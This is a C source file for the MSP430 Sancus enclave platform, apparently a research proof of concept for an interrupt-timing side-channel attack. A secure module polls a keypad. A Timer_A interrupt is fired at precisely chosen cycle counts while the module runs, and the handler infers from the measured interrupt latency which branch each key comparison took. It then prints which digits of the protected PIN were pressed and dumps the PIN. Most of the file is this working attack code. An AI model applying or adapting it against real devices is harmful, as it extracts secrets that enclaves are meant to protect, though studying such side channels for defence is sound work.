#include <sancus/sm_support.h>
#include <sancus_support/uart.h>
#include <msp430.h>
#include "sm-pin.h"
#include <sancus_support/sm_io.h>

#define ENABLE_SANCUS_PROTECTION        1
#define DO_ATTACK                       1
#define DO_MMIO_VIOLATION               0
#define DEBUG                           0

/* ============================== MAIN ================================== */

#if DEBUG
    #define DEBUG_PRINT(fmt, args...)   printf(fmt, args)
#else
    #define DEBUG_PRINT(fmt, args...)
#endif

#define TACTL_DISABLE       (TACLR)
#define TACTL_ENABLE        (TASSEL_2 + MC_1 + TAIE)
#define TACTL_CONTINUOUS    ((TASSEL_2 + MC_2) & ~TAIE)

/*
 * Operate Timer_A in continuous mode to act like a Time Stamp Counter.
 */
#define TSC_TIMER_A_START                   \
    TACTL = TACTL_DISABLE;                  \
    TACCR0 = 0x1;                           \
    TACTL = TACTL_CONTINUOUS;

/*
 * Fire an IRQ after the specified number of cycles have elapsed. Timer_A TAR
 * register will continue counting from zero after IRQ generation.
 */
#define IRQ_TIMER_A( interval )             \
    TACTL = TACTL_DISABLE;                  \
    /* 1 cycle overhead TACTL write */      \
    TACCR0 = interval - 1;                  \
    /* source mclk, up mode */              \
    TACTL = TACTL_ENABLE;

int __global_thrid = 1;
int tsc_cmp_enter, tsc_cmp_reti_if, tsc_cmp_reti_else;
int irq_cnt, isr_pin_idx, isr_measure_reti;
int isr_pressed[NB_KEYS] = {0};

int main(void)
{
    WDTCTL = WDTPW | WDTHOLD;

    msp430_io_init();

    #if ENABLE_SANCUS_PROTECTION    
        sancus_enable(&secure);
        pr_sm_info(&secure);
        //sancus_enable(&spy);
        //pr_sm_info(&spy);
        sancus_enable(&key_mmio);
        pr_sm_info(&key_mmio);
        //sancus_enable(&spy_mmio);
        //pr_sm_info(&spy_mmio);
    #endif
    
    /** Enable TimerA interrupt source and init SMs **/
    asm("eint\n\t");
    sm_secure_poll_keypad();

#if 0
    do_spy_init();

    /** measure reference execution times via spy SM **/
    // number of cycles from entry up to first comparison
    spy_mmio_ret_val = 0x0001;
    TSC_TIMER_A_START
    sm_spy_measure();
    tsc_cmp_enter = spy_tsc - 3 - 1;    // overhead dummy driver + spy_grab_tsc
    do_spy_init();

    // IRQ after first conditional jump in if branch; measure number of cycles
    // from ISR reti up to next conditional jump
    isr_measure_reti = 1;
    spy_mmio_ret_val = 0x0003;
    IRQ_TIMER_A( tsc_cmp_enter+3 )                      // overhead dummy driver
    sm_spy_measure();
    tsc_cmp_reti_if = spy_tsc - 3 - 1 - tsc_bitshift;   // overhead spy_grab_tsc
    do_spy_init();

    // IRQ after first conditional jump in else branch; measure number of cycles
    // from ISR reti up to next conditional jump
    spy_mmio_ret_val = 0x0002;
    IRQ_TIMER_A( tsc_cmp_enter+3 )                      // overhead dummy driver
    sm_spy_measure();
    tsc_cmp_reti_else = spy_tsc - 1 - tsc_bitshift;     // overhead spy_grab_tsc
    isr_measure_reti = 0;
    do_spy_init();

    puts("\n[main] spy SM execution time report:");
    puts("    ______________________________________");
    printf("    %3d | first key comparison\n", tsc_cmp_enter);
    printf("    %3d | counter-dependent bit shift\n", tsc_bitshift);
    printf("    %3d | reti if to subsequent comparison\n", tsc_cmp_reti_if);
    printf("    %3d | reti else to subsequent comparison\n", tsc_cmp_reti_else);
#endif
    
#if 0
    TSC_TIMER_A_START
    sm_secure_poll_keypad();
    printf("    %3d | first key comparison\n", spy_tsc);
#endif

    /** Enter SM with TimerA set for first key comparison **/
    puts("\n[main] enter secure PIN...");
    int pin_nb_left = PIN_LEN;
    while (pin_nb_left)
    {
        irq_cnt = 0;

        // enter the SM; ISR will learn first keypress comparison
        #if DO_ATTACK
            IRQ_TIMER_A( 646 )
        #endif
        pin_nb_left = sm_secure_poll_keypad();
    }

    dump_secure_pin();
    
    #if DO_MMIO_VIOLATION
        puts("\n[main] accessing P2 MMIO region...");
        P2SEL = 0x0;
    #endif
    
    puts("\n[main] exiting...");
    EXIT();
}


/* =========================== TIMER A ISR =============================== */

#if ENABLE_SANCUS_PROTECTION
    #define HW_IRQ_LATENCY      34
#else
    #define HW_IRQ_LATENCY      32
#endif
#define ISR_STACK_SIZE          512

#define CMP_DIR_CYCLES          2

uint16_t __isr_stack[ISR_STACK_SIZE];
void*    __isr_sp = &__isr_stack[ISR_STACK_SIZE-1];
void*    __isr_reti_addr;
int      __isr_tar_entry;

#define WRAP_ISR(fct)                                           \
    asm(    "mov &%0, &__isr_tar_entry                  \n\t"   \
            "mov &__isr_sp, r1                          \n\t"   \
            /* unprotected domain is not interrupted in test */ \
            "mov r15, &__isr_reti_addr                  \n\t"   \
            "mov r15, r14                               \n\t"   \
            /* sancus_get_caller_id */                          \
            ".word 0x1387                               \n\t"   \
            "call #" #fct "                             \n\t"   \
            /* simulate reti with gie enabled in status */      \
            /* word to terminate ISR atomic section     */      \
            "mov #0xfffe, r4                            \n\t"   \
            "push &__isr_reti_addr                      \n\t"   \
            "push #0x0008                               \n\t"   \
            /* enable TimerA and enter SM */                    \
            "mov r15, &%1                               \n\t"   \
            "reti                                       \n\t"   \
            ::"m"(TAR),"m"(TACTL):);

char isr_key_to_char(int key)
{
    static char keymap[] = {
        '1', '4', '7', '0',
        '2', '5', '8', 'F',
        '3', '6', '9', 'E',
        'A', 'B', 'C', 'D'
    };

    return keymap[key];
}

uint16_t do_timerA_isr(sm_id callerID, void* retiAddr)
{
    TACTL = TACTL_DISABLE;
    //DEBUG_PRINT("\n[isr] timer A IRQ with callerID %x and retiAddr %p\n", \
                                                        callerID, retiAddr);

    if (isr_measure_reti)
    {
        TACCR0 = 0x1;
        return TACTL_CONTINUOUS;
    }

    /** Calculate fine-grained IRQ latency **/
    int latency = __isr_tar_entry - HW_IRQ_LATENCY - 1;
    DEBUG_PRINT("[isr] IRQ latency is %d\n", latency);

    /** Leak info on keyPress comparison **/
    volatile int pressed = 0, released = 0, if_branch = (latency != CMP_DIR_CYCLES);

    if (if_branch && !isr_pressed[irq_cnt])
    {
        printf("\t[isr] key '%c' was pressed!\n", isr_key_to_char(irq_cnt));
        isr_pressed[irq_cnt] = 1;
        isr_pin_idx++;
        pressed = 1;
    }
    else if (!if_branch && isr_pressed[irq_cnt])
    {
        printf("\t[isr] key '%c' was released!\n", isr_key_to_char(irq_cnt));
        isr_pressed[irq_cnt] = 0;
        released = 1;
    }
    
    /** Continue with TimerA set for next key comparison, if any **/
    if (++irq_cnt < NB_KEYS && isr_pin_idx < PIN_LEN)
    {
        // Calculate next interrupt interval, based on whether the if branch
        // was taken, and whether the key has been released
        int interval = 113;
        if (if_branch && pressed)  interval += 19;
        else if (if_branch) interval += 2;

        TACCR0 = interval;
        return TACTL_ENABLE;
    }
    return TACTL_DISABLE;
}

__attribute__ ((naked)) __attribute__((interrupt(16))) void timerA_isr(void)
{
    WRAP_ISR(do_timerA_isr)
}

